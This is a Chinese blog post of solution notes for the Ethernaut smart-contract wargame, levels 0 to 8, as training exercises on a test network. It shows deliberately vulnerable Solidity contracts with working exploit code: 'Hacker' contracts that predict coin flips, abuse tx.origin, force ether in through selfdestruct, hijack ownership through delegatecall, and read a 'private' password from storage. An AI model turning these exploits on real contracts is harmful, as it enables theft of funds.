<!DOCTYPE html>












  


<html class="theme-next gemini use-motion" lang="zh-CN">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">


























<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">

<link rel="stylesheet" href="/css/main.css?v=7.0.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.0.0">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=7.0.0">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.0.0">


  <link rel="mask-icon" href="/images/logo.svg?v=7.0.0" color="#222">







<script id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '7.0.0',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: false,
    fastclick: false,
    lazyload: false,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>


  




  <meta name="description" content="Ethernaut复活了，赶紧开始做题">
<meta name="keywords" content="blockchain ethernet">
<meta property="og:type" content="article">
<meta property="og:title" content="Ethernaut 通关笔记">
<meta property="og:url" content="https://ainevsia.github.io/2021/02/21/Ethernaut/index.html">
<meta property="og:site_name" content="无花果">
<meta property="og:description" content="Ethernaut复活了，赶紧开始做题">
<meta property="og:locale" content="zh-CN">
<meta property="og:image" content="https://ainevsia.github.io/2021/02/21/Ethernaut/Snipaste_2021-03-07_18-52-18.png">
<meta property="og:image" content="https://ainevsia.github.io/2021/02/21/Ethernaut/Snipaste_2021-03-07_19-32-10.png">
<meta property="og:image" content="https://ainevsia.github.io/2021/02/21/Ethernaut/11.png">
<meta property="og:image" content="https://ainevsia.github.io/2021/02/21/Ethernaut/outofgas.png">
<meta property="og:image" content="https://ainevsia.github.io/2021/02/21/Ethernaut/exec_revert.png">
<meta property="og:image" content="https://ainevsia.github.io/2021/02/21/Ethernaut/ak.png">
<meta property="og:updated_time" content="2021-05-06T02:10:28.503Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Ethernaut 通关笔记">
<meta name="twitter:description" content="Ethernaut复活了，赶紧开始做题">
<meta name="twitter:image" content="https://ainevsia.github.io/2021/02/21/Ethernaut/Snipaste_2021-03-07_18-52-18.png">



  <link rel="alternate" href="/atom.xml" title="无花果" type="application/atom+xml">




  <link rel="canonical" href="https://ainevsia.github.io/2021/02/21/Ethernaut/">



<script id="page.configurations">
  CONFIG.page = {
    sidebar: "",
  };
</script>

  <title>Ethernaut 通关笔记 | 无花果</title>
  












  <noscript>
  <style>
  .use-motion .motion-element,
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-title { opacity: initial; }

  .use-motion .logo,
  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">无花果</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
    
      
        <p class="site-subtitle">浊以静之徐清，安以动之徐生。</p>
      
    
    
  </div>

  <div class="site-nav-toggle">
    <button aria-label="切换导航栏">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>



<nav class="site-nav">
  
    <ul id="menu" class="menu">
      
        
        
        
          
          <li class="menu-item menu-item-home">

    
    
    
      
    

    

    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-about">

    
    
    
      
    

    

    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-tags">

    
    
    
      
    

    

    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-categories">

    
    
    
      
    

    

    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-archives">

    
    
    
      
    

    

    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>

  </li>

      
      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
        </li>
      
    </ul>
  

  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



  



</div>
    </header>

    
  
  
  
  

  

  <a href="https://github.com/ainevsia" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" style="fill: #222; color: #fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>



    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          
            

          
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://ainevsia.github.io/2021/02/21/Ethernaut/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Ainevsia">
      <meta itemprop="description" content="Personal Blog">
      <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/31178818?s=400&u=04fe60fc9fd9e159806f4c2363ab9a4da748bf84&v=4">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="无花果">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">Ethernaut 通关笔记

              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2021年02月21日 10:52:18" itemprop="dateCreated datePublished" datetime="2021-02-21T10:52:18+08:00">2021年02月21日</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">更新于</span>
                
                <time title="修改时间：2021年05月06日 10:10:28" itemprop="dateModified" datetime="2021-05-06T10:10:28+08:00">2021年05月06日</time>
              
            
          </span>

          

          
            
            
              
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
            
                <span class="post-meta-item-text">评论数：</span>
                <a href="/2021/02/21/Ethernaut/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count valine-comment-count" data-xid="/2021/02/21/Ethernaut/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          
            <span class="post-meta-divider">|</span>
            <span class="post-meta-item-icon">
            <i class="fa fa-eye"></i>
             阅读次数： 
            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
            </span>
          

          
            <div class="post-symbolscount">
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">本文字数：</span>
                
                <span title="本文字数">48k</span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">44 分钟</span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>Ethernaut复活了，赶紧开始做题</p>
<a id="more"></a>
<h1 id="Level-0-Hello-Ethernaut"><a href="#Level-0-Hello-Ethernaut" class="headerlink" title="Level 0. Hello Ethernaut"></a>Level 0. Hello Ethernaut</h1><p>使用的是浏览器里的js对象的方式来进行的，之前还没有尝试过</p>
<h1 id="Level-1-Fallback"><a href="#Level-1-Fallback" class="headerlink" title="Level 1. Fallback"></a>Level 1. Fallback</h1><p>需要知道怎么在console里调用函数的时候附加上交易的value值，以及如何调用fallback函数。不用web3py的操作一开始还真不太会。</p>
<h1 id="Level-2-Fallout"><a href="#Level-2-Fallout" class="headerlink" title="Level 2. Fallout"></a>Level 2. Fallout</h1><p>一款对程序猿友好的字体是多么重要。</p>
<p><img src="./Snipaste_2021-03-07_18-52-18.png" alt></p>
<p>一开始在网页里看我是根本没看出来还有这回事，还加了个迷惑性极强的注释，导致我看了一圈发现没有改owner的操作啊。</p>
<p>复制到编辑器里就稍微明显一点了，不然我是真看不出区别。</p>
<h1 id="Level-3-Coin-Flip"><a href="#Level-3-Coin-Flip" class="headerlink" title="Level 3. Coin Flip"></a>Level 3. Coin Flip</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line"></span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 FACTOR = <span class="number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">constructor</span>() public &#123;</span><br><span class="line">    consecutiveWins = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">flip</span>(<span class="params">bool _guess</span>) <span class="title">public</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    uint256 blockValue = uint256(blockhash(block.number - (<span class="number">1</span>)));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lastHash == blockValue) &#123;</span><br><span class="line">      revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash = blockValue;</span><br><span class="line">    uint256 coinFlip = blockValue / (FACTOR);</span><br><span class="line">    bool side = coinFlip == <span class="number">1</span> ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (side == _guess) &#123;</span><br><span class="line">      consecutiveWins++;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      consecutiveWins = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Hacker &#123;</span><br><span class="line">    </span><br><span class="line">    address target = <span class="number">0xDD0b2E36064953cD7b75c0a35aF25D82fF948575</span>;</span><br><span class="line">    uint256 FACTOR = <span class="number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;</span><br><span class="line">    </span><br><span class="line">    CoinFlip cf = CoinFlip(target);</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">exploit</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number - (<span class="number">1</span>)));</span><br><span class="line">        uint256 coinFlip = blockValue / (FACTOR);</span><br><span class="line">        bool side = coinFlip == <span class="number">1</span> ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line">        cf.flip(side);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>还需要顺便复习一下web3py的用法</p>
<p><img src="./Snipaste_2021-03-07_19-32-10.png" alt></p>
<p>最新的<a href="https://web3py.readthedocs.io/en/stable/web3.eth.html?highlight=getstorage" target="_blank" rel="noopener">文档</a>已经用<code>get_storage_at</code>这个函数了</p>
<h1 id="Level-4-Telephone"><a href="#Level-4-Telephone" class="headerlink" title="Level 4. Telephone"></a>Level 4. Telephone</h1><p><a href="https://docs.soliditylang.org/en/latest/security-considerations.html?highlight=tx.origin#tx-origin" target="_blank" rel="noopener">tx.origin</a>是交易的发送方，不是方法调用的调用方。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">constructor</span>() public &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">changeOwner</span>(<span class="params">address _owner</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (tx.origin != msg.sender) &#123;</span><br><span class="line">      owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Hacker &#123;</span><br><span class="line">    <span class="keyword">constructor</span> () public &#123;</span><br><span class="line">        address payable account = <span class="number">0x9B3754c0a0798aDe51e98c7a81aE73aAcf9C2e5F</span>;</span><br><span class="line">        address target  = <span class="number">0xDe3CaD19ADcbCC04674FE56B0627C230e7b81f4A</span>;</span><br><span class="line">        Telephone t = Telephone(target);</span><br><span class="line">        t.changeOwner(account);</span><br><span class="line">        selfdestruct(account);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [8]: w3.eth.getStorageAt(w3.toChecksumAddress('0xDe3CaD19ADcbCC04674FE56B0627C230e7b81f4A'),0)</span><br><span class="line">Out[8]: HexBytes('0x0000000000000000000000009b3754c0a0798ade51e98c7a81ae73aacf9c2e5f')</span><br></pre></td></tr></table></figure>
<h1 id="Level-5-Token"><a href="#Level-5-Token" class="headerlink" title="Level 5. Token"></a>Level 5. Token</h1><p>一开始也是没有注意到有整数溢出，<code>require(balances[msg.sender] - _value &gt;= 0);</code> 和<code>require(balances[msg.sender] &gt;= _vale);</code>这两个是不一样的。</p>
<p>第一个是先做了减法运算的，然后和0进行比较，而第二个是两个数直接进行比较。</p>
<p>注意转账的接收方不能是自己，不然溢出之后又溢出回来了。</p>
<h1 id="Level-6-Delegation"><a href="#Level-6-Delegation" class="headerlink" title="Level 6. Delegation"></a>Level 6. Delegation</h1><blockquote>
<p>There exists a special variant of a message call, named <strong>delegatecall</strong> which is identical to a message call apart from the fact that the code at the target address is executed in the context of the calling contract and <code>msg.sender</code> and <code>msg.value</code> do not change their values.</p>
<p>This means that a contract can dynamically load code from a different address at runtime. Storage, current address and balance still refer to the calling contract, only the code is taken from the called address.</p>
<p>This makes it possible to implement the “library” feature in Solidity: Reusable library code that can be applied to a contract’s storage, e.g. in order to implement a complex data structure.</p>
</blockquote>
<p><code>&lt;address&gt;.delegatecall(bytes memory) returns (bool, bytes memory)</code></p>
<p>issue low-level DELEGATECALL with the given payload, returns success condition and return data, forwards all available gas, adjustable</p>
<h2 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract Delegate &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">constructor</span>(address _owner) public &#123;</span><br><span class="line">    owner = _owner;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Delegation &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line">  Delegate delegate;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">constructor</span>(address _delegateAddress) public &#123;</span><br><span class="line">    delegate = Delegate(_delegateAddress);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fallback() external &#123;</span><br><span class="line">    (bool result, bytes memory data) = address(delegate).delegatecall(msg.data);</span><br><span class="line">    <span class="keyword">if</span> (result) &#123;</span><br><span class="line">      <span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>The instance must be the <code>Delegation</code> contract.</p>
<p>The fallback function of <code>Delegation</code> contract trys to call the delegate address.</p>
<p>And the <code>Delegate</code> contract has a pwn function that can change its ower to <code>msg.sender</code> . Since the delegatecall will not change <code>msg.sener</code>, we can change the owner to our attacker address.</p>
<p>Notice that delegatecall only copys code from the target address to the current contract and executes, so the effect of doing the <code>pwn()</code> function is changing <code>contract Delegation</code> ‘s owner variable, which are all at <code>storage[0]</code>.</p>
<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>just call the fallback function of the <code>Delegation</code> contract, and msg.data set to <code>keccack(&#39;pwn()&#39;) = 0xdd365b8b</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.sendTransaction(&#123;<span class="attr">data</span> : <span class="string">"0xdd365b8b"</span>&#125;)</span><br><span class="line"><span class="keyword">await</span> contract.owner()</span><br></pre></td></tr></table></figure>
<h1 id="Level-7-Force"><a href="#Level-7-Force" class="headerlink" title="Level 7. Force"></a>Level 7. Force</h1><blockquote>
<p>Some contracts will simply not take your money ¯_(ツ)_/¯</p>
<p>The goal of this level is to make the balance of the contract greater than zero.</p>
</blockquote>
<h2 id="Source-1"><a href="#Source-1" class="headerlink" title="Source"></a>Source</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract Force &#123;<span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">                   MEOW ?</span></span><br><span class="line"><span class="comment">         /\_/\   /</span></span><br><span class="line"><span class="comment">    ____/ o o \</span></span><br><span class="line"><span class="comment">  /~____  =ø= /</span></span><br><span class="line"><span class="comment"> (______)__m_m)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span>&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Decompiled"><a href="#Decompiled" class="headerlink" title="Decompiled"></a>Decompiled</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">contract Contract &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        memory[<span class="number">0x40</span>:<span class="number">0x60</span>] = <span class="number">0x80</span>;</span><br><span class="line">        revert(memory[<span class="number">0x00</span>:<span class="number">0x00</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>so the default fallback generated is simply revert.</p>
<p>Well i have no idea, so I searched for other people’s wp.</p>
<blockquote>
<p>强行将以太币置入合约的相关方式：1. 通过自毁、2. 创建前预先发送Ether、3. 为其挖矿。</p>
</blockquote>
<h2 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h2><p>I first forget to mark the contructor payable, and remix gives me kindly warnings:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">creation of Hacker errored: VM error: revert. revert The transaction has been reverted to the initial state. Note: The called function should be payable if you send value and the value you send should be less than your current balance. Debug the transaction to get more information.</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: GPL-3.0</span></span><br><span class="line"></span><br><span class="line">pragma solidity &gt;<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract Hacker &#123;</span><br><span class="line">    <span class="keyword">constructor</span>() payable &#123;</span><br><span class="line">        selfdestruct(payable(<span class="number">0x2CcA84F27Bc45eFEEDce279C7c6dF6D0D02186b4</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Level-8-Vault"><a href="#Level-8-Vault" class="headerlink" title="Level 8. Vault"></a>Level 8. Vault</h1><blockquote>
<p>Unlock the vault to pass the level!</p>
</blockquote>
<h2 id="Source-2"><a href="#Source-2" class="headerlink" title="Source"></a>Source</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract Vault &#123;</span><br><span class="line">  bool public locked;</span><br><span class="line">  bytes32 private password;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">constructor</span>(bytes32 _password) public &#123;</span><br><span class="line">    locked = <span class="literal">true</span>;</span><br><span class="line">    password = _password;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">unlock</span>(<span class="params">bytes32 _password</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (password == _password) &#123;</span><br><span class="line">      locked = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Exploit-2"><a href="#Exploit-2" class="headerlink" title="Exploit"></a>Exploit</h2><p>no secret on blockchain.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: <span class="keyword">from</span> web3.auto.infura.rinkeby <span class="keyword">import</span> w3</span><br><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: public = <span class="string">'0x817d3fcDf81E62AaaA1caf5e8CBD9b1417346d65'</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]: addr = w3.toChecksumAddress(public)</span><br><span class="line"></span><br><span class="line">In [<span class="number">4</span>]: w3.eth.get_storage_at(addr,<span class="number">0</span>)</span><br><span class="line">Out[<span class="number">4</span>]: HexBytes(<span class="string">'0x0000000000000000000000000000000000000000000000000000000000000001'</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">5</span>]: w3.eth.get_storage_at(addr,<span class="number">1</span>)</span><br><span class="line">Out[<span class="number">5</span>]: HexBytes(<span class="string">'0x412076657279207374726f6e67207365637265742070617373776f7264203a29'</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">await</span> contract.unlock(<span class="string">'0x412076657279207374726f6e67207365637265742070617373776f7264203a29'</span>)</span><br></pre></td></tr></table></figure>
